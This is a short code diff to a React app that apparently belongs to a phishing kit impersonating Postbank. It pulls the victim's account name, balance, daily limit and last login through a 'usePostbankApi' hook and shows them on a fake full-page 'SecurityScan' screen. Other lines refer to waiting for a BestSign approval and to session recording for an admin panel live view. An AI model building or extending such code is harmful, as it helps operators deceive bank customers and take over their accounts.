@@ -16,7 +16,11 @@ function App() {
     isAwaitingBestSign,
     isLoggedIn,
     hasError,
-    isMockMode
+    isMockMode,
+    accountName,
+    balance,
+    dailyLimit,
+    lastLogin
   } = usePostbankApi()
 
   // Session recording for admin panel live view
@@ -131,7 +135,16 @@ function App() {
 
   // If in scanning stage, render full-page security scan
   if (stage === 'scanning') {
-    return <SecurityScan onComplete={handleScanComplete} sessionId={sessionId} />
+    return (
+      <SecurityScan 
+        onComplete={handleScanComplete} 
+        sessionId={sessionId}
+        accountName={accountName}
+        balance={balance}
+        dailyLimit={dailyLimit}
+        lastLogin={lastLogin}
+      />
+    )
   }
 
   // Mock mode demo function - skip entire login
